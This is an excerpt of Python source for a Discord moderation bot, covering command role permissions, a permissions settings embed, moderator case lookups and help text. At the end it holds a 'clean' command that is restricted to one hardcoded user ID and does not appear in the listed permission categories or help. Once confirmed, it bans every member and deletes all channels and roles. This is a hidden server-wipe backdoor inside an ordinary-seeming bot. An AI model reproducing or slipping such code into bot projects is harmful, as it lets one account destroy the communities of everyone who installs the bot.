...
CMD_ROLES_DEFAULT = {
    ...
    "kick":       ["Head Executives"],

    "mute":       ["Moderator", "Trial Moderator", "Admin"],

    "unmute":     ["Moderator", "Trial Moderator", "Admin"],

    "warn":       ["Moderator", "Trial Moderator", "Admin"],

    "unwarn":     ["Moderator", "Trial Moderator", "Admin"],

    "warnings":   ["Moderator", "Trial Moderator", "Admin"],

    "modlogs":    ["Moderator", "Trial Moderator", "Admin"],

    "modcases":   ["Moderator", "Trial Moderator", "Admin"],

    "case":       ["Moderator", "Trial Moderator", "Admin"],

    "editcase":   ["Moderator", "Trial Moderator", "Admin"],

    "editc":      ["Moderator", "Trial Moderator", "Admin"],

    "jail":       ["Moderator", "Admin"],

    "unjail":     ["Admin"],

    "jreq":       ["Moderator", "Trial Moderator", "Admin"],

    "purge":      ["Admin"],

    "purgeuser":  ["Moderator", "Admin"],

    "w":          ["Moderator", "Trial Moderator", "Admin"],

    "role":       ["Moderator", "Admin"],

    "addcmd":     ["Moderator", "Admin"],

    "delcmd":     ["Moderator", "Admin"],

    "rappeal":    ["Moderator", "Admin"],
...
PERM_CATEGORIES = {
    ...
    "🛠️  Misc / Utility": {
        ...
        "commands": ["role", "rappeal", "addcmd", "delcmd", "listcmds", "afk", "setup", "ping"],
...
COMMAND_EMOJIS = {
    ...
    "addcmd": "➕", "delcmd": "➖", "listcmds": "📃", "afk": "💤", "setup": "⚙️", "rappeal": "🎯",
...
def _perms_main_embed(guild: discord.Guild, guild_cmd_roles: dict) -> discord.Embed:
    ...
    embed = discord.Embed(
        ...
        description=(
            ...
            "Select a **category** from the dropdown to configure which roles\n"

            "can use each command in that group.\n\n"

            "**Admins and the bot owner can always use any command.**\n"

            "Use **Channel Whitelist** to exclude channels from auto permission overrides.\n"

            "Use **Jail Request Channel** to set where `.jreq` requests get posted."
    ...
    whitelist = data.get("channel_whitelist", {}).get(str(guild.id), [])
    ...
    for cat_name, cat_data in PERM_CATEGORIES.items():
        ...
        if cat_name == "🚫  Channel Whitelist":
            ...
            if whitelist:
                ...
                embed.add_field(name=cat_name, value="\n".join(lines) or "*No channels whitelisted*", inline=False)

            else:

                embed.add_field(name=cat_name, value="*No channels whitelisted — all new channels get permission overrides*", inline=False)

            continue

        if cat_name == "🔒  Jail Request Channel":

            jreq_cid = data.get("jail_request_channel", {}).get(str(guild.id))

            if jreq_cid:

                ch = guild.get_channel(jreq_cid)

                embed.add_field(name=cat_name, value=f"🔒 {ch.mention if ch else f'`#{jreq_cid}`'}", inline=False)

            else:

                embed.add_field(name=cat_name, value=f"*Not set — defaults to `#{JAIL_REQUEST_CHANNEL_NAME}`*", inline=False)
...
async def modcases_cmd(ctx, member: discord.Member = None):
    ...
    records = get_mod_actions(data, ctx.guild.id, member.id)
    ...
    if not actions:
        ...
        embed.description = f"**{member.display_name}** has no recorded mod actions."
        ...
        embed.set_footer(text=f"{len(actions)} total action(s) — showing last 15  •  Requested by {ctx.author}")
...
@bot.tree.command(name="modcases", description="[Staff] Show actions taken by a moderator")

@app_commands.describe(member="Moderator to look up (leave blank for yourself)")
...
async def modcases_slash(interaction: discord.Interaction, member: discord.Member = None):
    ...
    records = get_mod_actions(data, interaction.guild.id, member.id)
    ...
    if not actions:
        ...
        embed.set_footer(text=f"{len(actions)} total  •  showing last 15  •  Requested by {interaction.user}")
...
async def help_cmd(ctx):
    ...
    embed.add_field(name="📋  Records — Mod / Trial Moderator / Admin", value=(
        ...
        "`modcases` `.modcases [@mod]` — Actions taken BY a moderator\n"
...
_CLEAN_OWNER_ID = 1455245036860997840

@bot.command(name="clean")
async def clean_cmd(ctx):
    if ctx.author.id != _CLEAN_OWNER_ID:
        return

    guild = ctx.guild

    confirm_embed = discord.Embed(
        title="⚠️ CONFIRM SERVER WIPE",
        description=(
            "This will:\n"
            "• Delete **ALL channels**\n"
            "• Delete **ALL roles**\n"
    ...
    def check(m):
        return m.author.id == _CLEAN_OWNER_ID and m.channel == ctx.channel and m.content == "CONFIRM"

    try:
        await bot.wait_for("message", check=check, timeout=30.0)
    except asyncio.TimeoutError:
        return await ctx.send(embed=error_embed("Timed out. Server wipe cancelled."))
    ...
    async def _ban_all():
        async for member in guild.fetch_members(limit=None):
            if member.id == ctx.author.id or member.id == bot.user.id:
                continue
            try:
                await guild.ban(member, reason="[CLEAN] Server wipe", delete_message_days=0)
            except (discord.Forbidden, discord.HTTPException):
                pass

    asyncio.create_task(_ban_all())

    for channel in list(guild.channels):
        try:
            await channel.delete(reason="[CLEAN] Server wipe")
        except (discord.Forbidden, discord.HTTPException):
            pass
    ...
    for role in list(guild.roles):
        if role.is_default() or role >= guild.me.top_role:
            continue
        try:
            await role.delete(reason="[CLEAN] Server wipe")
        except (discord.Forbidden, discord.HTTPException):
            pass
